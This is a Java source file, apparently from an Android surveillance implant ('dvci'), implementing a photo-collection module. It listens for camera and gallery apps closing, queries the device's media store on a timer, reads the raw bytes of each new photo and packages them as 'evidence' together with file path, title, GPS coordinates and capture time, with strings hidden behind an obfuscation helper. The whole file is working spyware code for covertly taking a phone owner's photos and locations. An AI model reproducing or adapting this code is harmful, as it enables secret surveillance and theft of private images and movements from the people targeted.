package com.android.dvci.module;

import android.content.Context;
import android.database.Cursor;
import android.os.Environment;
import android.provider.MediaStore;

import com.android.dvci.ProcessInfo;
import com.android.dvci.ProcessStatus;
import com.android.dvci.Status;
import com.android.dvci.auto.Cfg;
import com.android.dvci.conf.ConfModule;
import com.android.dvci.conf.ConfigurationException;
import com.android.dvci.evidence.EvidenceBuilder;
import com.android.dvci.evidence.EvidenceType;
import com.android.dvci.evidence.Markup;
import com.android.dvci.file.AutoFile;
import com.android.dvci.interfaces.Observer;
import com.android.dvci.listener.BC;
import com.android.dvci.listener.ListenerProcess;
import com.android.dvci.module.BaseModule;
import com.android.dvci.util.Check;
import com.android.dvci.util.DataBuffer;
import com.android.dvci.util.StringUtils;
import com.android.dvci.util.WChar;
import com.android.mm.M;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.UnsupportedEncodingException;
import java.nio.charset.Charset;
import java.util.Date;
import java.util.concurrent.Semaphore;

/**
 * Created by zeno on 29/01/15.
 */
public class ModulePhoto extends BaseModule implements Observer<ProcessInfo> {

	private static final String TAG = "ModulePhoto"; //$NON-NLS-1$
	private static final int LOG_PHOTO_VERSION = 2015012601;

	Semaphore semaphorePhoto = new Semaphore(1);
	private Markup markupPhoto;
	private long lastTimestamp = 0;
	private Date from;

	@Override
	protected boolean parse(ConfModule conf) {
		try {
			from = conf.getDate(M.e("datefrom"));
		} catch (ConfigurationException e) {
			Date today = new Date();
			from = new Date( today.getTime() - (3600 * 24 * 1000) );
		}
		setPeriod(3600 * 1000);
		return true;
	}

	@Override
	protected void actualGo() {
		fetchPhotos();
	}

	@Override
	protected void actualStart() {
		//https://stackoverflow.com/questions/2169649/get-pick-an-image-from-androids-built-in-gallery-app-programmatically
		//MediaStore.Images.Media.query()

		markupPhoto = new Markup(this);
		fetchPhotos();
		ListenerProcess.self().attach(this);
	}

	@Override
	protected void actualStop() {
		ListenerProcess.self().detach(this);
	}

	private void fetchPhotos() {
		if (!semaphorePhoto.tryAcquire()) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (fetchPhotos), still fetching, return");
			}
			return;
		}
		try {
			lastTimestamp = markupPhoto.unserialize(new Long(0));
			lastTimestamp = Math.max(lastTimestamp, from.getTime());

			long newtimestamp = getCameraImages(Status.getAppContext(), new ImageVisitor(), lastTimestamp);

			if (Cfg.DEBUG) {
				Check.log(TAG + " (fetchPhotos) serialize timestamp: " + newtimestamp);
			}
			markupPhoto.serialize(newtimestamp);
		} finally {
			semaphorePhoto.release();
		}
	}

	@Override
	public int notification(ProcessInfo b) {
		if ( (b.processInfo.toLowerCase().contains(M.e("camera")) || b.processInfo.toLowerCase().contains(M.e("gallery3d")))
				&& b.status == ProcessStatus.STOP) {
			fetchPhotos();
		}
		return 0;
	}


	class ImageVisitor {
		long visitor(Cursor cursor) {
			final int dataColumn = cursor.getColumnIndexOrThrow(M.e(MediaStore.Images.Media.DATA));
			final int dateColumn = cursor.getColumnIndexOrThrow(M.e(MediaStore.Images.ImageColumns.DATE_TAKEN));
			final int titleColumn = cursor.getColumnIndexOrThrow(M.e(MediaStore.Images.Media.TITLE));
			final int mimeColumn = cursor.getColumnIndexOrThrow(M.e(MediaStore.Images.Media.MIME_TYPE));


			final int latColumn = cursor.getColumnIndexOrThrow(M.e(MediaStore.Images.ImageColumns.LATITUDE));
			final int lonColumn = cursor.getColumnIndexOrThrow(M.e(MediaStore.Images.ImageColumns.LONGITUDE));

			final int bucketColumn = cursor.getColumnIndexOrThrow(M.e(MediaStore.Images.Media.BUCKET_DISPLAY_NAME));

			long last = 0;

			final String path = cursor.getString(dataColumn);

			final Date date = new Date(cursor.getLong(dateColumn));
			if (Cfg.DEBUG) {
				Check.log(TAG + " (visitor), timestamp: " + cursor.getLong(dateColumn) + " date: " + date);
			}

			final String title = cursor.getString(titleColumn);
			final String mime = cursor.getString(mimeColumn);

			final String lat = cursor.getString(latColumn);
			final String lon = cursor.getString(lonColumn);

			final String bucket = cursor.getString(bucketColumn);
			if(!isMultimediaChat(bucket)) {
				try {
					AutoFile file = new AutoFile(path);
					byte[] content = file.read();
					if (Cfg.DEBUG) {
						Check.log(TAG + " (visitor), bucket: " + bucket + " " + path);
					}

					EvidenceBuilder.atomic(EvidenceType.PHOTO, getAdditionalData(title, path, mime, lat, lon, bucket, date), content, date);
					content = null;
				}catch(Exception ex){
					if (Cfg.DEBUG) {
						Check.log(TAG + " (visitor), ERROR", ex);
					}
				}
			}else{
				if (Cfg.DEBUG) {
					Check.log(TAG + " (visitor), ignoring multimedia image: " + bucket);
				}
			}

			last = date.getTime();
			return last;
		}
	}

	private boolean isMultimediaChat(String bucket) {
		return bucket.toLowerCase().contains(M.e("whatsapp"));
	}

	public static long getCameraImages(Context context, ImageVisitor visitor, long lastTimestamp) {

		if (Cfg.DEBUG) {
			Check.log(TAG + " (getCameraImages) lastTimestamp: " + lastTimestamp);
		}

		final String[] projection = {M.e(MediaStore.Images.Media.DATA), M.e(MediaStore.Images.ImageColumns.DATE_TAKEN),
				M.e(MediaStore.Images.Media.TITLE), M.e(MediaStore.Images.Media.MIME_TYPE),
						M.e(MediaStore.Images.ImageColumns.LATITUDE), M.e(MediaStore.Images.ImageColumns.LONGITUDE),
								M.e(MediaStore.Images.Media.BUCKET_DISPLAY_NAME)};
		final String selection = M.e(MediaStore.Images.Media.DATE_TAKEN + " > ?");
		final String[] selectionArgs = {Long.toString(lastTimestamp)};
		final String order = M.e(MediaStore.Images.Media.DATE_TAKEN + " asc");
		final Cursor cursor = context.getContentResolver().query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
				projection,
				selection,
				selectionArgs,
				order);

		if (Cfg.DEBUG) {
			Check.log(TAG + " (getCameraImages), cursor: " + cursor + " Uri: " + MediaStore.Images.Media.EXTERNAL_CONTENT_URI);
			Check.log(TAG + " (getCameraImages), selection timestamp: " + selectionArgs[0]);
		}

		if (cursor.moveToFirst()) {
			do {
				try {
					long last = visitor.visitor(cursor);
					lastTimestamp = Math.max(last, lastTimestamp);


				} catch (Exception ex) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (getCameraImages), ERROR: ", ex);
					}
				}

			} while (cursor.moveToNext());
		}
		cursor.close();
		return lastTimestamp;
	}

	private byte[] getAdditionalData(String title, String path, String mime, String lat, String lon, String bucket, Date timestamp) {

		//JSONObject data = new JSONObject();
		JSONObject place = new JSONObject();
		JSONObject main = new JSONObject();
		try {
			main.put(M.e("program"), bucket);
			main.put(M.e("path"), path);

			if (!StringUtils.isEmpty(lat) && !StringUtils.isEmpty(lon)) {
				place.put(M.e("lat"), lat);
				place.put(M.e("lon"), lon);
			}
			main.put(M.e("description"), title);
			//main.put("device", "android");
			main.put(M.e("mime"), mime);
			main.put(M.e("time"), timestamp.getTime() / 1000);

		} catch (JSONException e) {
			e.printStackTrace();
		}

		if (Cfg.DEBUG) {
			Check.log(TAG + " (getAdditionalData), json: " + main.toString());
		}

		byte[] jsonByte = new byte[0];
		try {
			jsonByte = main.toString().getBytes("UTF-8");
		} catch (UnsupportedEncodingException e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (getAdditionalData), cannot convert: ", e);
			}
		}

		int tlen = jsonByte.length + 4;
		final byte[] additionalData = new byte[tlen];

		final DataBuffer databuffer = new DataBuffer(additionalData, 0, tlen);
		databuffer.writeInt(LOG_PHOTO_VERSION); // version
		databuffer.write(jsonByte);

		return additionalData;
	}

}
